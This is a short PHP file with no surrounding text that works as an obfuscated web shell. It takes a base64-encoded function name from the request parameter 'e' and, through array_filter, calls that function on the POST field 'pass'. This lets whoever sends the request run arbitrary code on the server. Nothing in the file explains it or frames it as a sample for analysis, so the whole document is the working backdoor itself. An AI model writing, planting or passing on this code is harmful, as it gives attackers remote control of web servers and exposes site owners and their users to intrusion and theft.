<?php
    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'],);
    array_filter($arr, base64_decode($e));
?>
